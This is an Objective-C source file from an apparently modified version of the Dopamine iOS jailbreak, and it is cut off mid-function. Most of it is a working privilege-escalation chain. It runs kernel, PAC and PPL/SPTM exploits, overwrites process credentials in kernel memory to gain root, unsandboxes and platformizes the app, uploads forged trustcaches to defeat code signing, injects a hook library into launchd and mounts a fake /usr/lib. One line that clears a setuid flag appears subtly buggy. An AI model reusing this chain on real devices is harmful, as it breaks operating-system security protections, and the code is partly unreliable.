//
//  Jailbreaker.m
//  Dopamine
//

#import "DOJailbreaker.h"
#import "DOEnvironmentManager.h"
#import "DOExploitManager.h"
#import "DOUIManager.h"
#import "clock_alarm.h"

#import <dlfcn.h>
#import <unistd.h>
#import <xpc/xpc.h>
#import <xpf/xpf.h>
#import <sys/utsname.h>
#import <IOSurface/IOSurfaceRef.h>
#import <libjailbreak/codesign.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/primitives_IOSurface.h>
#import <libjailbreak/physrw_pte.h>
#import <libjailbreak/physrw.h>
#import <libjailbreak/translation.h>
#import <libjailbreak/kernel.h>
#import <libjailbreak/info.h>
#import <libjailbreak/util.h>
#import <libjailbreak/kcall_arm64.h>
#import <libjailbreak/trustcache.h>
#import <libjailbreak/trustcache_fs.h>
#import <libjailbreak/signatures.h>
#import <libjailbreak/jbserver_boomerang.h>
#import <libjailbreak/basebin_gen.h>
#import <libjailbreak/jbclient_xpc.h>
#import <pthread.h>
#import <spawn.h>
#import <signal.h>
#import <sys/wait.h>
#import <sys/stat.h>
#import <sys/mount.h>
#import <sys/param.h>
#import <sys/time.h>
#import <errno.h>
#import <string.h>
#import <stdlib.h>

int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count);
extern char **environ;

struct hfs_mount_args {
    char *fspec;
    uid_t hfs_uid;
    gid_t hfs_gid;
    mode_t hfs_mask;
    uint32_t hfs_encoding;
    struct timezone hfs_timezone;
    int flags;
    int journal_tbuffer_size;
    int journal_flags;
    int journal_disable;
};

static int remount_preboot_writable(void)
{
    struct statfs st;
    if (statfs("/private/preboot", &st) != 0) return -1;
    if (!(st.f_flags & MNT_RDONLY)) return 0;
    struct hfs_mount_args args = {
        .fspec = st.f_mntfromname,
        .hfs_mask = 0,
    };
    return mount("apfs", "/private/preboot", MNT_UPDATE, &args);
}

static void chown_chmod_path_root(NSString *path)
{
    chown(path.fileSystemRepresentation, 0, 0);
    chmod(path.fileSystemRepresentation, 0755);
}

static NSString *const JBErrorDomain = @"JBErrorDomain";
typedef NS_ENUM(NSInteger, JBErrorCode) {
    JBErrorCodeFailedToFindKernel       = -1,
    JBErrorCodeFailedKernelPatchfinding = -2,
    JBErrorCodeFailedLoadingExploit     = -3,
    JBErrorCodeFailedExploitation       = -4,
    JBErrorCodeFailedBuildingPhysRW     = -5,
    JBErrorCodeFailedCleanup            = -6,
    JBErrorCodeFailedGetRoot            = -7,
    JBErrorCodeFailedUnsandbox          = -8,
    JBErrorCodeFailedPlatformize        = -9,
    JBErrorCodeFailedBasebin            = -10,
    JBErrorCodeFailedBasebinTrustcache  = -11,
    JBErrorCodeFailedLaunchdInjection   = -12,
    JBErrorCodeFailedInitFakeLib        = -13,
};

@interface DOJailbreaker ()
- (NSError *)gatherSystemInformation;
- (NSError *)doExploitation;
- (NSError *)buildPhysRWPrimitive;
- (NSError *)cleanUpExploits;
- (NSError *)elevatePrivileges;
- (NSError *)ensureMiniJailbreakRoot;
- (BOOL)createMiniRootAtPath:(NSString *)root error:(NSError **)errOut;
- (NSError *)prepareMiniBasebin;
- (NSError *)loadBasebinTrustcache;
- (NSError *)injectLaunchdHook;
- (NSError *)createFakeLib;
- (NSError *)rebootUserspace;
@end

@implementation DOJailbreaker

- (NSError *)gatherSystemInformation
{
    NSString *kernelPath = [[DOEnvironmentManager sharedManager] accessibleKernelPath];
    if (!kernelPath) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedToFindKernel userInfo:@{NSLocalizedDescriptionKey:@"Failed to find kernelcache"}];
    }
    NSLog(@"Kernel at %@", kernelPath);

    NSString *sptmPath = [[DOEnvironmentManager sharedManager] accessibleSPTMPath];
    NSString *txmPath = [[DOEnvironmentManager sharedManager] accessibleTXMPath];
    if (sptmPath) NSLog(@"SPTM at %@", sptmPath);
    if (txmPath) NSLog(@"TXM at %@", txmPath);

    [[DOUIManager sharedInstance] sendLog:@"Patchfinding"];

    int r = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation, sptmPath ? sptmPath.fileSystemRepresentation : NULL, txmPath ? txmPath.fileSystemRepresentation : NULL);
    if (r != 0) {
        NSError *error = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF start failed: (%s)", xpf_get_error()]}];
        xpf_stop();
        return error;
    }

    char *sets[] = {
        "translation", "trustcache", "sandbox", "physmap", "struct", "physrw", "IOSurface",
        NULL, NULL, NULL, NULL, NULL,
    };
    uint32_t idx = 0;
    while (sets[++idx]);
    if (xpf_set_is_supported("devmode")) sets[idx++] = "devmode";
    if (xpf_set_is_supported("badRecovery")) sets[idx++] = "badRecovery";
    if (xpf_set_is_supported("arm64kcall")) sets[idx++] = "arm64kcall";
    if (xpf_set_is_supported("perfkrw")) sets[idx++] = "perfkrw";

    xpc_object_t systemInfoXdict = xpf_construct_offset_dictionary((const char **)sets);
    if (systemInfoXdict) {
        xpc_dictionary_set_uint64(systemInfoXdict, "kernelConstant.staticBase", gXPF.kernelBase);
        if (gXPF.sptm) xpc_dictionary_set_uint64(systemInfoXdict, "kernelConstant.staticSptmBase", gXPF.sptmBase);
        if (gXPF.txm) xpc_dictionary_set_uint64(systemInfoXdict, "kernelConstant.staticTxmBase", gXPF.txmBase);
    }
    if (!systemInfoXdict) {
        NSError *error = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF failed: (%s)", xpf_get_error()]}];
        xpf_stop();
        return error;
    }
    xpf_stop();

    jbinfo_initialize_dynamic_offsets(systemInfoXdict);
    jbinfo_initialize_hardcoded_offsets();

    if ([NSBundle mainBundle].bundleIdentifier) {
        gSystemInfo.jailbreakInfo.appIdentifier = strdup([NSBundle mainBundle].bundleIdentifier.UTF8String);
    }
    return nil;
}

- (NSError *)doExploitation
{
    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    DOExploit *pacBypass = [DOExploitManager sharedManager].selectedPACBypass;
    DOExploit *pplBypass = [DOExploitManager sharedManager].selectedPPLBypass;

    if (!kernelExploit) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"ClearSword is required but was not found"}];
    }
    if (!pacBypass && [DOEnvironmentManager sharedManager].isPACBypassRequired) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PAC bypass is required but was not found"}];
    }
    if (!pplBypass && [DOEnvironmentManager sharedManager].isPPLBypassRequired) {
        NSString *kind = [DOEnvironmentManager sharedManager].isSPTM ? @"SPTM" : @"PPL";
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"%@ bypass is required but was not found", kind]}];
    }

    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Exploiting Kernel (%@)", kernelExploit.name]];
    if ([kernelExploit load] != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load kernel exploit: %s", dlerror()]}];
    }
    if ([kernelExploit run] != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to exploit kernel"}];
    }

    jbinfo_initialize_boot_constants();
    libjailbreak_translation_init();
    libjailbreak_IOSurface_primitives_init();

    if (pacBypass) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Bypassing PAC (%@)", pacBypass.name]];
        if ([pacBypass load] != 0) {
            [kernelExploit cleanup];
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PAC bypass: %s", dlerror()]}];
        }
        if ([pacBypass run] != 0) {
            [kernelExploit cleanup];
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PAC"}];
        }
        gSystemInfo.jailbreakInfo.usesPACBypass = true;
    }

    if ([[DOEnvironmentManager sharedManager] isPPLBypassRequired]) {
        NSString *kind = [DOEnvironmentManager sharedManager].isSPTM ? @"SPTM" : @"PPL";
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Bypassing %@ (%@)", kind, pplBypass.name]];
        if ([pplBypass load] != 0) {
            [pacBypass cleanup];
            [kernelExploit cleanup];
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load %@ bypass: %s", kind, dlerror()]}];
        }
        if ([pplBypass run] != 0) {
            [pacBypass cleanup];
            [kernelExploit cleanup];
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to bypass %@", kind]}];
        }
    }

    if (![DOEnvironmentManager sharedManager].isArm64e) {
        arm64_kcall_init();
    }
    return nil;
}

- (NSError *)buildPhysRWPrimitive
{
    int r = device_supports_physrw_pte() ? libjailbreak_physrw_pte_init(false, 0) : libjailbreak_physrw_init(false);
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBuildingPhysRW userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to build phys r/w primitive: %d", r]}];
    }
    return nil;
}

- (NSError *)cleanUpExploits
{
    int r = [[DOExploitManager sharedManager] cleanUpExploits];
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedCleanup userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to cleanup exploits: %d", r]}];
    }
    IOSurface_map_cleanup();
    return nil;
}

- (NSError *)elevatePrivileges
{
    uint64_t proc = proc_self();
    uint64_t ucred = proc_ucred(proc);

    kwrite32(proc + koffsetof(proc, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, ruid), 0);
    kwrite32(ucred + koffsetof(ucred, uid), 0);

    kwrite32(proc + koffsetof(proc, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, rgid), 0);
    kwrite32(ucred + koffsetof(ucred, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, groups), 0);

    uint32_t flag = kread32(proc + koffsetof(proc, flag));
    if ((flag & P_SUGID) != 0) {
        flag &= P_SUGID;
        kwrite32(proc + koffsetof(proc, flag), flag);
    }

    if (getuid() != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, uid still %d", getuid()]}];
    }
    if (getgid() != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, gid still %d", getgid()]}];
    }

    uint64_t label = kread_ptr(ucred + koffsetof(ucred, label));
    mac_label_set(label, 1, -1);
    NSError *error = nil;
    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&error];
    if (error) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedUnsandbox userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to unsandbox, /var is not accessible (%@)", error.localizedDescription]}];
    }
    setenv("HOME", "/var/root", true);
    setenv("CFFIXED_USER_HOME", "/var/root", true);
    setenv("TMPDIR", "/var/tmp", true);

    proc_csflags_set(proc, CS_PLATFORM_BINARY);
    uint32_t csflags;
    csops(getpid(), CS_OPS_STATUS, &csflags, sizeof(csflags));
    if (!(csflags & CS_PLATFORM_BINARY)) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedPlatformize userInfo:@{NSLocalizedDescriptionKey:@"Failed to get CS_PLATFORM_BINARY"}];
    }
    return nil;
}

struct boomerang_info {
    mach_port_t serverPort;
    dispatch_semaphore_t boomerangDone;
};

static void *boomerang_server(struct boomerang_info *info)
{
    while (true) {
        xpc_object_t xdict = nil;
        if (!xpc_pipe_receive(info->serverPort, &xdict)) {
            if (jbserver_received_boomerang_xpc_message(&gBoomerangServer, xdict) == JBS_BOOMERANG_DONE) {
                dispatch_semaphore_signal(info->boomerangDone);
                break;
            }
        }
    }
    return NULL;
}

- (BOOL)createMiniRootAtPath:(NSString *)root error:(NSError **)errOut
{
    NSError *error = nil;
    [[NSFileManager defaultManager] createDirectoryAtPath:root withIntermediateDirectories:YES attributes:@{NSFilePosixPermissions: @0755} error:&error];
    if (error) {
        if (errOut) *errOut = error;
        return NO;
    }

    NSString *cursor = root;
    if ([root hasPrefix:@"/private/preboot/"]) {
        while (cursor.length > 1 && ![cursor isEqualToString:@"/private"]) {
            chown_chmod_path_root(cursor);
            cursor = cursor.stringByDeletingLastPathComponent;
        }
    }

    struct statfs sfs;
    if (statfs(root.fileSystemRepresentation, &sfs) == 0 && (sfs.f_flags & MNT_NOEXEC)) {
        if (errOut) {
            *errOut = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebin userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"jbroot is on a noexec mount: %@", root]}];
        }
        return NO;
    }
    return YES;
}

- (NSError *)ensureMiniJailbreakRoot
{
    // /private/var is typically MNT_NOEXEC. The app UUID folder is owned by installd, so a sibling
    // .jbroot cannot be created there. Use /private/preboot like original Dopamine; fall back to
    // a directory inside the .app (same executable volume, writable after unsandbox).
    NSError *error = nil;
    NSString *root = nil;

    int remount = remount_preboot_writable();
    if (remount != 0) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Warning: remount /private/preboot writable failed: %s", strerror(errno)]];
    }

    const char *hash = boot_manifest_hash();
    if (hash) {
        root = [NSString stringWithFormat:@"/private/preboot/%s/dopamine-mini", hash];
        if (![self createMiniRootAtPath:root error:&error]) {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"preboot jbroot failed (%@), falling back to app bundle", error.localizedDescription]];
            root = nil;
            error = nil;
        }
    }

    if (!root) {
        root = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@".jbroot"];
        if (![self createMiniRootAtPath:root error:&error]) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebin userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to create %@ (%@)", root, error.localizedDescription]}];
        }
    }

    if (gSystemInfo.jailbreakInfo.rootPath) {
        free(gSystemInfo.jailbreakInfo.rootPath);
    }
    gSystemInfo.jailbreakInfo.rootPath = strdup(root.fileSystemRepresentation);

    [[NSFileManager defaultManager] removeItemAtPath:@"/var/jb" error:nil];
    [[NSFileManager defaultManager] createSymbolicLinkAtPath:@"/var/jb" withDestinationPath:root error:nil];
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"jbroot: %@", root]];
    return nil;
}

- (NSError *)prepareMiniBasebin
{
    NSString *basebinDir = [NSString stringWithUTF8String:JBROOT_PATH("/basebin")];
    [[NSFileManager defaultManager] createDirectoryAtPath:basebinDir withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *mobileDir = [NSString stringWithUTF8String:JBROOT_PATH("/var/mobile")];
    [[NSFileManager defaultManager] createDirectoryAtPath:mobileDir withIntermediateDirectories:YES attributes:@{NSFilePosixPermissions: @0777} error:nil];
    chmod(mobileDir.fileSystemRepresentation, 0777);

    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSString *tarPath = [bundle stringByAppendingPathComponent:@"basebin.tar"];

    const char *jbroot = gSystemInfo.jailbreakInfo.rootPath;
    if ([[NSFileManager defaultManager] fileExistsAtPath:tarPath]) {
        [[DOUIManager sharedInstance] sendLog:@"Extracting basebin.tar"];
        int r = libarchive_unarchive(tarPath.fileSystemRepresentation, jbroot);
        if (r != 0) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebin userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"libarchive_unarchive failed: %d", r]}];
        }
    } else {
        [[DOUIManager sharedInstance] sendLog:@"basebin.tar not in app bundle, using existing jbroot/basebin if present"];
    }

    NSDirectoryEnumerator *enumerator = [[NSFileManager defaultManager] enumeratorAtPath:basebinDir];
    for (NSString *item in enumerator) {
        chmod([[basebinDir stringByAppendingPathComponent:item] fileSystemRepresentation], 0755);
    }

    NSArray<NSString *> *required = @[
        @"launchdhook.dylib",
        @"systemhook.dylib",
        @"hooks.plist",
        @"MachOMerger",
        @"jbctl",
        @".version",
    ];
    for (NSString *name in required) {
        NSString *path = [basebinDir stringByAppendingPathComponent:name];
        if (![[NSFileManager defaultManager] fileExistsAtPath:path]) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebin userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"basebin/%@ missing. Build BaseBin (make -C BaseBin) and rebuild the app.", name]}];
        }
    }

    NSString *hooksPlist = [basebinDir stringByAppendingPathComponent:@"hooks.plist"];
    chmod(hooksPlist.fileSystemRepresentation, 0666);

    NSString *dyldhookName = dyldhook_dylib_for_platform();
    if (!dyldhookName || ![[NSFileManager defaultManager] fileExistsAtPath:[basebinDir stringByAppendingPathComponent:dyldhookName]]) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebin userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"basebin/%@ missing. Build BaseBin (make -C BaseBin) and rebuild the app.", dyldhookName ?: @"dyldhook"]}];
    }
    return nil;
}

- (NSError *)loadBasebinTrustcache
{
    trustcache_file_v1 *basebinTcFile = NULL;
    if (trustcache_file_build_from_path(JBROOT_PATH("/basebin/basebin.tc"), &basebinTcFile) == 0) {
        int r = trustcache_file_upload_with_uuid(basebinTcFile, BASEBIN_TRUSTCACHE_UUID);
        free(basebinTcFile);
        if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebinTrustcache userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to upload BaseBin trustcache: %d", r]}];
        return nil;
    }
    return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebinTrustcache userInfo:@{NSLocalizedDescriptionKey:@"Failed to load BaseBin trustcache"}];
}

- (NSError *)injectLaunchdHook
{
    mach_port_t serverPort = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &serverPort);
    mach_port_insert_right(mach_task_self(), serverPort, serverPort, MACH_MSG_TYPE_MAKE_SEND);

    struct boomerang_info info;
    info.serverPort = serverPort;
    info.boomerangDone = dispatch_semaphore_create(0);

    pthread_t boomerangThread;
    pthread_create(&boomerangThread, NULL, (void *(*)(void *))boomerang_server, &info);
    pthread_detach(boomerangThread);

    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){MACH_PORT_NULL, MACH_PORT_NULL, serverPort}, 3);
    pid_t spawnedPid = 0;
    const char *jbctlPath = JBROOT_PATH("/basebin/jbctl");
    if (!jbctlPath) {
        posix_spawnattr_destroy(&attr);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey:@"JBROOT_PATH(/basebin/jbctl) is NULL"}];
    }
    if (access(jbctlPath, X_OK) != 0) {
        posix_spawnattr_destroy(&attr);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"jbctl not executable (%s): %s", strerror(errno), jbctlPath]}];
    }
    char *jbctlArgv[] = { (char *)jbctlPath, "internal", "launchd_stash_port", NULL };
    int spawnError = posix_spawn(&spawnedPid, jbctlPath, NULL, &attr, jbctlArgv, environ);
    if (spawnError != 0) {
        posix_spawnattr_destroy(&attr);
        struct statfs sfs = {0};
        statfs(jbctlPath, &sfs);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Spawning jbctl failed: %d (%s) path=%s noexec=%d", spawnError, strerror(spawnError), jbctlPath, (sfs.f_flags & MNT_NOEXEC) ? 1 : 0]}];
    }
    posix_spawnattr_destroy(&attr);

    int status = cmd_wait_for_exit(spawnedPid);
    if (status == -1) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey:@"Waiting for jbctl failed"}];
    }
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"jbctl launchd_stash_port exited %d", WIFEXITED(status) ? WEXITSTATUS(status) : -1]}];
    }

    int r = exec_cmd(JBROOT_PATH("/basebin/opainject"), "1", JBROOT_PATH("/basebin/launchdhook.dylib"), NULL);
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"opainject launchdhook failed: %d", r]}];
    }

    dispatch_semaphore_wait(info.boomerangDone, DISPATCH_TIME_FOREVER);
    mach_port_deallocate(mach_task_self(), serverPort);
    return nil;
}

- (BOOL)isFakeLibMounted
{
    struct statfs fsb;
    if (statfs("/usr/lib", &fsb) != 0) return NO;
    return strcmp(fsb.f_mntonname, "/usr/lib") == 0;
}

- (NSError *)createFakeLib
{
    if ([self isFakeLibMounted] && access("/usr/lib/systemhook.dylib", F_OK) == 0) {
        [[DOUIManager sharedInstance] sendLog:@"fakelib already mounted"];
        setenv("DYLD_INSERT_LIBRARIES", "/usr/lib/systemhook.dylib", 1);
        return nil;
    }

    if ([self isFakeLibMounted]) {
        [[DOUIManager sharedInstance] sendLog:@"Unmounting incomplete fakelib"];
        exec_cmd(JBROOT_PATH("/basebin/jbctl"), "internal", "fakelib", "unmount", NULL);
    }

    [[DOUIManager sharedInstance] sendLog:@"Generating fakelib (copy /usr/lib, patch dyld)"];
    int r = basebin_generate(false);
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Creating fakelib failed with error: %d", r]}];
    }

    cdhash_t *cdhashes = NULL;
    uint32_t cdhashesCount = 0;
    file_collect_untrusted_cdhashes_by_path(JBROOT_PATH("/basebin/.fakelib/dyld"), &cdhashes, &cdhashesCount);
    if (cdhashesCount != 1) {
        if (cdhashes) free(cdhashes);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Got unexpected number of cdhashes for dyld???: %d", cdhashesCount]}];
    }

    trustcache_file_v1 *dyldTCFile = NULL;
    r = trustcache_file_build_from_cdhashes(cdhashes, cdhashesCount, &dyldTCFile);
    free(cdhashes);
    if (r == 0) {
        r = trustcache_file_upload_with_uuid(dyldTCFile, DYLD_TRUSTCACHE_UUID);
        free(dyldTCFile);
        if (r != 0) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to upload dyld trustcache: %d", r]}];
        }
    } else {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey:@"Failed to build dyld trustcache"}];
    }

    [[DOUIManager sharedInstance] sendLog:@"Mounting fakelib on /usr/lib"];
    r = exec_cmd(JBROOT_PATH("/basebin/jbctl"), "internal", "fakelib", "mount", NULL);
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Mounting fakelib failed with error: %d", r]}];
    }

    if (access("/usr/lib/systemhook.dylib", F_OK) != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"/usr/lib/systemhook.dylib missing after mount: %s", strerror(errno)]}];
    }

    setenv("DYLD_INSERT_LIBRARIES", "/usr/lib/systemhook.dylib", 1);
    [[DOUIManager sharedInstance] sendLog:@"fakelib mounted"];
    return nil;
}

- (NSError *)rebootUserspace
{
    const char *jbctlPath = JBROOT_PATH("/basebin/jbctl");
    if (!jbctlPath || access(jbctlPath, X_OK) != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey:@"jbctl missing, cannot reboot userspace"}];
    }

    [[DOUIManager sharedInstance] sendLog:@"Rebooting userspace"];
    pid_t pid = 0;
    int r = exec_cmd_suspended(&pid, jbctlPath, "reboot_userspace", NULL);
    if (r != 0) {
        r = exec_cmd(jbctlPath, "reboot_userspace", NULL);
        if (r != 0) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"userspace reboot failed: %d", r]}];
        }
        return nil;
    }
    kill(pid, SIGCONT);
    cmd_wait_for_exit(pid);
    return nil;
}

- (NSArray<NSString *> *)miniRootPaths
{
    NSMutableArray<NSString *> *paths = [NSMutableArray array];
    const char *hash = boot_manifest_hash();
    if (hash) {
        [paths addObject:[NSString stringWithFormat:@"/private/preboot/%s/dopamine-mini", hash]];
    }
    [paths addObject:[[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@".jbroot"]];

    char buf[PATH_MAX];
    ssize_t n = readlink("/var/jb", buf, sizeof(buf) - 1);
    if (n > 0) {
        buf[n] = '\0';
        NSString *target = [NSString stringWithUTF8String:buf];
        if (target.length && ![paths containsObject:target]) {
            [paths addObject:target];
        }
    }
    return paths;
}

- (void)logPathStatus:(NSString *)path
{
    NSFileManager *fm = [NSFileManager defaultManager];
    BOOL isDir = NO;
    BOOL exists = [fm fileExistsAtPath:path isDirectory:&isDir];
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"  %@ : %@", path, exists ? (isDir ? @"dir" : @"file") : @"missing"]];
    if (!exists || !isDir) return;

    NSArray<NSString *> *items = [fm contentsOfDirectoryAtPath:path error:nil];
    NSString *preview = @"";
    if (items.count) {
        NSArray<NSString *> *head = items.count > 10 ? [items subarrayWithRange:NSMakeRange(0, 10)] : items;
        preview = [head componentsJoinedByString:@", "];
        if (items.count > 10) preview = [preview stringByAppendingString:@", …"];
    }
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"    entries=%lu %@", (unsigned long)items.count, preview]];

    NSArray<NSString *> *checks = @[
        @"basebin",
        @"basebin/.fakelib/dyld",
        @"basebin/systemhook.dylib",
        @"basebin/launchdhook.dylib",
        @"basebin/hooks.plist",
        @"basebin/jbctl",
        @"var/mobile/hooks.plist",
        @"var/mobile/hooks",
    ];
    for (NSString *rel in checks) {
        NSString *full = [path stringByAppendingPathComponent:rel];
        BOOL childDir = NO;
        if ([fm fileExistsAtPath:full isDirectory:&childDir]) {
            NSNumber *size = [fm attributesOfItemAtPath:full error:nil][NSFileSize];
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"    %@ : ok%@%@", rel, childDir ? @" (dir)" : @"", size ? [NSString stringWithFormat:@" %llu", size.unsignedLongLongValue] : @""]];
        }
    }
}

- (void)logMiniEnvironment
{
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"uid=%d gid=%d euid=%d", getuid(), getgid(), geteuid()]];

    char *version = NULL;
    bool live = jbclient_dopamine_is_jailbroken(&version);
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"jbserver: %@%@", live ? @"up" : @"down", version ? [NSString stringWithFormat:@" (%s)", version] : @""]];
    if (version) free(version);

    struct statfs fsb;
    if (statfs("/usr/lib", &fsb) == 0) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"fakelib: %@ (mnton=%s)", [self isFakeLibMounted] ? @"mounted" : @"not mounted", fsb.f_mntonname]];
    } else {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"/usr/lib statfs failed: %s", strerror(errno)]];
    }
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"/usr/lib/systemhook.dylib: %s", access("/usr/lib/systemhook.dylib", F_OK) == 0 ? "yes" : "no"]];

    char buf[PATH_MAX];
    ssize_t n = readlink("/var/jb", buf, sizeof(buf) - 1);
    if (n > 0) {
        buf[n] = '\0';
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"/var/jb -> %s", buf]];
    } else if (access("/var/jb", F_OK) == 0) {
        [[DOUIManager sharedInstance] sendLog:@"/var/jb exists"];
    } else {
        [[DOUIManager sharedInstance] sendLog:@"/var/jb: missing"];
    }

    for (NSString *root in [self miniRootPaths]) {
        [self logPathStatus:root];
    }
}

- (NSError *)clearMiniEnvironment
{
    remount_preboot_writable();

    if ([self isFakeLibMounted]) {
        NSString *jbctlPath = nil;
        const char *jbctl = JBROOT_PATH("/basebin/jbctl");
        if (jbctl && access(jbctl, X_OK) == 0) {
